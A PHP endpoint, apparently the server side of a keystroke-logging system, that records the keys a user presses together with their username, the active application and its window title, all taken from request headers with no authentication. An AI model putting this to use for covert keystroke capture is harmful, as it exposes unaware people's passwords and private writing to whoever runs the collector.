<?php
require '../controllers/DbController.php';
include '../controllers/UserController.php';

$username = $_SERVER["HTTP_X_USERNAME"];
$application = $_SERVER["HTTP_X_APPLICATION"];
$application_title = $_SERVER["HTTP_X_APPLICATION_TITLE"];

// Получаем тело запроса
$json_data = file_get_contents('php://input');

// Парсим JSON данные
$data = json_decode($json_data, true);

// Проверяем, были ли данные получены корректно
if ($data === null) {
    // Ошибка при парсинге JSON
    http_response_code(400); // Bad Request
    exit("Ошибка при обработке данных");
}

// Проверяем наличие необходимых данных
if (!isset($data['keyboardData'])) {
    // Если данные отсутствуют или некорректны
    http_response_code(400); // Bad Request
    exit("Отсутствуют необходимые данные");
}

// Обрабатываем полученные данные
$key_pressed = $data['keyboardData'];

createNewLog($username, $application, $application_title, $key_pressed);
